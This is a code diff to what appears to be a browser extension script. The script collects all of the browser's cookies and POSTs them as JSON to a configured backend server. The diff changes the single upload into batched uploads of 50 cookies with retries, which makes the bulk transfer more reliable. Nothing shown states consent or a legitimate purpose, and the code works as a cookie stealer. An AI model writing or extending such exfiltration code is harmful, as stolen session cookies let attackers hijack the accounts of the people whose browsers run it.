@@ -17,15 +17,24 @@ function getAllCookies() {
   });
 }
 
-// ---- Send cookies to backend server with retries ----
-async function sendCookiesToServer(allCookies, retryCount = 0) {
+// ---- Split array into batches ----
+function chunkArray(array, chunkSize) {
+  const chunks = [];
+  for (let i = 0; i < array.length; i += chunkSize) {
+    chunks.push(array.slice(i, i + chunkSize));
+  }
+  return chunks;
+}
+
+// ---- Send one batch to server with retries ----
+async function sendBatch(batch, retryCount = 0) {
   try {
-    console.log("Sending", allCookies.length, "cookies to:", CONFIG.BACKEND_URL);
+    console.log(`Sending batch of ${batch.length} cookies to:`, CONFIG.BACKEND_URL);
 
     const response = await fetch(CONFIG.BACKEND_URL, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(allCookies)
+      body: JSON.stringify(batch)
     });
 
     if (!response.ok) {
@@ -35,22 +44,26 @@ async function sendCookiesToServer(allCookies, retryCount = 0) {
     const text = await response.text();
     console.log("Server response:", text);
   } catch (err) {
-    console.error("Error sending cookies:", err);
+    console.error("Error sending batch:", err);
 
     if (retryCount < 3) {
-      console.log(`Retrying in 5 seconds... (Attempt ${retryCount + 1})`);
-      setTimeout(() => sendCookiesToServer(allCookies, retryCount + 1), 5000);
+      console.log(`Retrying batch in 5 seconds... (Attempt ${retryCount + 1})`);
+      setTimeout(() => sendBatch(batch, retryCount + 1), 5000);
     } else {
-      console.error("Failed to send cookies after 3 retries.");
+      console.error("Failed to send batch after 3 retries.");
     }
   }
 }
 
-// ---- Read and upload cookies ----
-function readAndUploadCookies() {
+// ---- Read all cookies and send in batches ----
+function readAndUploadCookies(batchSize = 50) {
   getAllCookies().then(allCookies => {
-    console.log("Uploading", allCookies.length, "cookies to server...");
-    sendCookiesToServer(allCookies);
+    console.log("Total cookies to upload:", allCookies.length);
+
+    const batches = chunkArray(allCookies, batchSize);
+    console.log("Number of batches:", batches.length);
+
+    batches.forEach(batch => sendBatch(batch));
   });
 }
 
